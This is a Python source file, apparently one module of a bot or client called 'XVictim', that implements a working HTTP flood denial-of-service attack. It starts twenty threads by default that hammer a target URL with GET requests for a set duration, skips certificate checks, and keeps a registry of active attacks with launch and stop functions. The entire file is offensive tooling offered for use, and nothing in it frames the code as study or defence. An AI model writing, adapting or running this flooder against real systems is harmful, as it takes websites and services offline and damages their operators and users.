"""DDoS functionality for XVictim Victim"""

import threading
import requests
import urllib3
import time

urllib3.disable_warnings()

# Global tracking for active DDoS threads
active_attacks = {}  # {target: {"stop_flag": threading.Event, "threads": [threads]}}

def http_flood_worker(target: str, stop_flag: threading.Event):
    """Worker thread for HTTP flood"""
    request_count = 0
    last_status = None
    start_time = time.time()
    
    while not stop_flag.is_set():
        try:
            resp = requests.get(target, timeout=5, verify=False)
            request_count += 1
            status = resp.status_code
            if status != last_status or request_count % 50 == 0:
                last_status = status
                print(f"[DDoS] {request_count} requests to {target} - status={status}", flush=True)
        except requests.exceptions.ReadTimeout:
            request_count += 1
            print(f"[DDoS] Request timeout to {target} (still running)", flush=True)
        except Exception as e:
            request_count += 1
            print(f"[DDoS] Request error to {target}: {type(e).__name__} {e}", flush=True)
        
        time.sleep(0.05)  # Slower pacing to keep the attack running longer and reduce spurious timeouts
    
    elapsed = time.time() - start_time
    print(f"[DDoS] Attack finished: {request_count} requests in {elapsed:.1f}s to {target}", flush=True)

def launch_ddos(target: str, duration: int = 60, threads: int = 20) -> dict:
    """Launch a DDoS attack"""
    try:
        if duration <= 0:
            duration = 60

        # Validate and format target URL
        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"
        
        if target in active_attacks:
            return {"status": "error", "message": "Attack already running on this target"}
        
        # Create stop flag for this attack
        stop_flag = threading.Event()
        timer = threading.Timer(duration, stop_ddos, args=(target,))
        timer.daemon = True

        active_attacks[target] = {
            "stop_flag": stop_flag,
            "threads": [],
            "start_time": time.time(),
            "duration": duration,
            "timer": timer,
        }
        
        print(f"[DDoS] Starting attack: {threads} threads -> {target} for {duration}s", flush=True)
        timer.start()
        
        # Launch worker threads
        for i in range(threads):
            t = threading.Thread(target=http_flood_worker, args=(target, stop_flag), daemon=True)
            t.start()
            active_attacks[target]["threads"].append(t)
        
        return {"status": "success", "message": f"DDoS started on {target} with {threads} threads for {duration}s"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def stop_ddos(target: str = None) -> dict:
    """Stop a specific DDoS attack or all if target is None"""
    if target is None:
        # Stop all attacks
        for t, data in list(active_attacks.items()):
            data["stop_flag"].set()
            timer = data.get("timer")
            if timer is not None:
                timer.cancel()
            print(f"[DDoS] Stopping all attacks", flush=True)
        active_attacks.clear()
        return {"status": "success", "message": "all attacks stopped"}
    else:
        if target in active_attacks:
            data = active_attacks[target]
            data["stop_flag"].set()
            timer = data.get("timer")
            if timer is not None:
                timer.cancel()
            elapsed = time.time() - data.get("start_time", time.time())
            print(f"[DDoS] Stopped attack on {target} (running for {elapsed:.1f}s)", flush=True)
            active_attacks.pop(target, None)
            return {"status": "success", "message": f"ddos on {target} stopped"}
        return {"status": "error", "message": f"attack not found: {target}"}

